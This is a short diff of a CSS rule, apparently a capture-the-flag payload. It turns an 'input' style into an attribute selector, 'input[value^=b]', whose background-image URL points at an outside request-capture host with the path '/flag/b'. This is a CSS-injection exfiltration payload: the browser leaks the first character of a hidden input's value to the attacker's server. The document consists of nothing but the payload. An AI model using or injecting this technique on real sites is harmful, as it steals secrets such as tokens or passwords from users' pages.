@@ -1,3 +1,3 @@
-input {
- background-image: url(https://newassasdas.free.beeceptor.com/flag) 
+input[value^=b] {
+ background-image: url(https://newassasdas.free.beeceptor.com/flag/b) 
 }
